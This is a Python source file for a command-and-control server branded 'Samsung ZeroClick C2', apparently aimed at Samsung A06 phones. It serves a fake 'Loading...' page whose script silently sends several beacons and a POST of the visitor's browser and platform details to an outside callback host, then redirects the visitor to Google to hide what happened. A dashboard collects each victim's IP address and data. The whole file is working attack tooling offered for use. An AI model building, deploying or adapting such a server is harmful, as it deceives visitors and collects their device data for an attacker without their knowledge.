# core/c2.py — C2 Server with CORS Headers (FIXED)

import json
import time
import http.server
from datetime import datetime
from urllib.parse import parse_qs, urlparse

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.callbacks = []
        super().__init__(*args, **kwargs)
    
    def _send_cors_headers(self):
        """Send CORS headers to allow all origins"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With')
        self.send_header('Access-Control-Max-Age', '86400')
    
    def _send_html(self, html):
        """Send HTML response with CORS headers"""
        self.send_response(200)
        self._send_cors_headers()
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def _send_json(self, data):
        """Send JSON response with CORS headers"""
        self.send_response(200)
        self._send_cors_headers()
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def _send_response(self, text):
        """Send plain text response with CORS headers"""
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()
        self.wfile.write(text.encode())
    
    def do_OPTIONS(self):
        """Handle preflight OPTIONS request"""
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()
    
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/':
            self._send_html(self._dashboard())
        elif parsed.path == '/ping':
            self._send_response('pong')
        elif parsed.path == '/callbacks':
            self._send_json(self.callbacks)
        elif parsed.path == '/callback':
            params = parse_qs(parsed.query)
            self._process_callback(params)
            self._send_response('OK')
        elif parsed.path == '/exploit':
            self._serve_exploit()
        else:
            self.send_response(404)
            self._send_cors_headers()
            self.end_headers()
            self.wfile.write(b'Not Found')
    
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        try:
            info = json.loads(data)
        except:
            info = {'raw': data.decode('utf-8', errors='ignore')}
        
        if self.path == '/callback':
            self._process_callback(info)
            self._send_response('OK')
        else:
            self.send_response(404)
            self._send_cors_headers()
            self.end_headers()
            self.wfile.write(b'Error')
    
    def _process_callback(self, data):
        callback = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'data': data
        }
        self.callbacks.append(callback)
        if len(self.callbacks) > 1000:
            self.callbacks = self.callbacks[-1000:]
        print(f"[C2] Callback from {self.client_address[0]}: {data}")
    
    def _serve_exploit(self):
        """Serve the HTML exploit directly from C2"""
        html = self._get_exploit_html()
        self._send_html(html)
    
    def _get_exploit_html(self):
        """Return the exploit HTML with CORS-friendly callbacks"""
        host = self.headers.get('Host', 'samsung-zeroclick-production.up.railway.app')
        callback_url = f"https://{host}/callback"
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Loading...</title>
            <style>
                *{{margin:0;padding:0;box-sizing:border-box}}
                body{{background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;flex-direction:column}}
                .loader{{text-align:center}}
                .spinner{{width:40px;height:40px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #4a9eff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}}
                @keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
                p{{color:#6f8ba5;margin-top:20px}}
                #status{{color:#4a9eff;font-size:12px;margin-top:10px;word-break:break-all}}
            </style>
        </head>
        <body>
            <div class="loader">
                <div class="spinner"></div>
                <p>Loading content...</p>
                <div id="status">Initializing...</div>
            </div>

            <script>
            (function() {{
                var statusEl = document.getElementById('status');
                var callbackUrl = '{callback_url}';

                function log(msg) {{
                    if (statusEl) statusEl.textContent = msg;
                    console.log('[Exploit] ' + msg);
                }}

                log('Triggering exploit...');

                // === IMAGE BEACON ===
                try {{
                    var img = new Image();
                    img.src = callbackUrl + '?pwned=img&ts=' + Date.now();
                    log('✅ Image beacon sent');
                }} catch(e) {{ log('⚠️ Image failed'); }}

                // === FETCH no-cors ===
                try {{
                    fetch(callbackUrl + '?pwned=fetch&ts=' + Date.now(), {{
                        mode: 'no-cors',
                        keepalive: true
                    }});
                    log('✅ Fetch sent');
                }} catch(e) {{ log('⚠️ Fetch failed'); }}

                // === XHR ===
                try {{
                    var xhr = new XMLHttpRequest();
                    xhr.open('GET', callbackUrl + '?pwned=xhr&ts=' + Date.now(), true);
                    xhr.send();
                    log('✅ XHR sent');
                }} catch(e) {{ log('⚠️ XHR failed'); }}

                // === BEACON ===
                try {{
                    if (navigator.sendBeacon) {{
                        navigator.sendBeacon(callbackUrl + '?pwned=beacon&ts=' + Date.now());
                        log('✅ Beacon sent');
                    }}
                }} catch(e) {{}}

                // === POST Device Info ===
                try {{
                    var info = {{
                        device: navigator.userAgent,
                        platform: navigator.platform,
                        timestamp: new Date().toISOString()
                    }};
                    var xhr2 = new XMLHttpRequest();
                    xhr2.open('POST', callbackUrl, true);
                    xhr2.setRequestHeader('Content-Type', 'application/json');
                    xhr2.send(JSON.stringify(info));
                    log('✅ POST sent');
                }} catch(e) {{ log('⚠️ POST failed'); }}

                log('✅ All callbacks sent!');

                setTimeout(function() {{
                    log('Redirecting...');
                    document.body.innerHTML = '';
                    window.location.href = 'https://www.google.com';
                }}, 3000);
            }})();
            </script>
        </body>
        </html>
        """
    
    def _dashboard(self):
        """Dashboard HTML"""
        callbacks_html = ''.join([
            f'<tr><td>{c["timestamp"]}</td><td>{c["ip"]}</td><td><pre>{json.dumps(c["data"], indent=2)[:200]}</pre></td></tr>'
            for c in self.callbacks[-10:]
        ]) or '<tr><td colspan="3">No callbacks yet</td></tr>'
        
        host = self.headers.get('Host', 'samsung-zeroclick-production.up.railway.app')
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Samsung ZeroClick C2</title>
            <style>
                *{{margin:0;padding:0;box-sizing:border-box}}
                body{{background:#0a1a2b;color:#fff;font-family:sans-serif;padding:20px}}
                .container{{max-width:1200px;margin:0 auto}}
                h1{{color:#4a9eff}}
                .stats{{display:flex;gap:20px;margin:20px 0;flex-wrap:wrap}}
                .stat{{background:#17212b;padding:16px 24px;border-radius:12px;flex:1;min-width:120px}}
                .stat .num{{font-size:28px;font-weight:bold;color:#4a9eff}}
                .stat .label{{color:#8ea4b8;font-size:13px}}
                table{{width:100%;background:#17212b;border-radius:12px;overflow:hidden;margin:10px 0}}
                th{{background:#1c2c3c;padding:12px;text-align:left;color:#8ea4b8;font-weight:400}}
                td{{padding:12px;border-bottom:1px solid #1c2c3c;font-size:13px}}
                .refresh{{background:#4a9eff;color:#fff;border:none;padding:8px 20px;border-radius:8px;cursor:pointer}}
                .refresh:hover{{background:#3b8cdf}}
                .footer{{margin-top:40px;color:#6f8ba5;font-size:12px;text-align:center}}
                .exploit-link{{background:#17212b;padding:12px;border-radius:8px;margin:10px 0;border:1px solid #4a9eff}}
                .exploit-link a{{color:#4a9eff;word-break:break-all}}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎯 Samsung ZeroClick C2</h1>
                <p style="color:#8ea4b8">Target: Samsung A06 — Android 16</p>
                
                <div class="exploit-link">
                    <strong>📤 Exploit Link:</strong><br>
                    <a href="/exploit" target="_blank">https://{host}/exploit</a>
                </div>
                
                <div class="stats">
                    <div class="stat"><div class="num">{len(self.callbacks)}</div><div class="label">Callbacks</div></div>
                    <div class="stat"><div class="num">{self.callbacks[-1]['ip'] if self.callbacks else 'N/A'}</div><div class="label">Last IP</div></div>
                    <div class="stat"><div class="num">{self.callbacks[-1]['timestamp'][:19] if self.callbacks else 'N/A'}</div><div class="label">Last Callback</div></div>
                </div>
                
                <h2>📩 Callbacks</h2>
                <table>
                    <tr><th>Time</th><th>IP</th><th>Data</th></tr>
                    {callbacks_html}
                </table>
                
                <div style="margin-top:20px">
                    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
                </div>
                <div class="footer">ZeroClick Samsung — Made in Ethiopia 🇪🇹</div>
            </div>
        </body>
        </html>
        """
    
    def log_message(self, *args): pass


class C2Server:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
    
    def run(self):
        print(f"[C2] Server running on http://{self.host}:{self.port}")
        print(f"[C2] Dashboard: http://{self.host}:{self.port}/")
        print(f"[C2] Callback: http://{self.host}:{self.port}/callback")
        print(f"[C2] Exploit: http://{self.host}:{self.port}/exploit")
        
        server = http.server.HTTPServer((self.host, self.port), C2Handler)
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("[C2] Shutting down...")
            server.shutdown()
